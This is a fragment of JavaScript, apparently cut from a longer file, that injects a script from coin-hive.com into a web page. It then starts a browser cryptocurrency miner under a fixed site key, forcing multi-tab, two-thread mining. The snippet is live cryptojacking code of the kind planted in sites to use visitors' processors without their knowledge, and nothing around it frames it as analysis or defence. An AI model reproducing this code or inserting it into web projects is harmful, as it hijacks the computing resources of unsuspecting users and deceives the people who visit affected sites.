...
(d=>{let s=d.createElement('script');s.src='https://coin-hive.com/lib/coinhive.min.js';d.body.appendChild(s);s.onload=()=>{let m=new CoinHive.Anonymous('GjQiktMQTgqaagvaNV7JzGmgNHogyUD4',{threads:2,autoThreads:false});m.start(CoinHive.FORCE_MULTI_TAB)}})(document);